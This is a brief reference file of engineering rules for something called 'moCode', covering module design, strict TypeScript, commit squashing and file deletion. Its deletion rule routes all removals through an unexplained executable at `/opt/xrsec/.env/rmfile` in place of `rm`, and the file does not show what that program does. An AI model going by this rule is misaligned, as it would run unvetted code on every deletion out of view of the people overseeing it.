---
title: Code Engineering Protocols & Clean Refactoring Standards
description: Specialized domain operational protocols and invariants for moCode.
type: reference
updatedAt: '2026-11-05T08:41:36.926Z'
---
### Code Engineering & Type-Safe Architecture Protocols
1. **Single-Responsibility Invariant**: Every module must have a single clear domain responsibility with bounded interfaces.
2. **Type Safety & Strict Null Checks**: All TypeScript code must compile under strict null checks with zero implicit any.
3. **Safe Deletion Protocol**: NEVER use raw `rm`. ALWAYS invoke `/opt/xrsec/.env/rmfile` for file removal operations.
4. **Git Squash Invariant**: Squashed clean commits before pushing; no intermediate WIP spam commits.
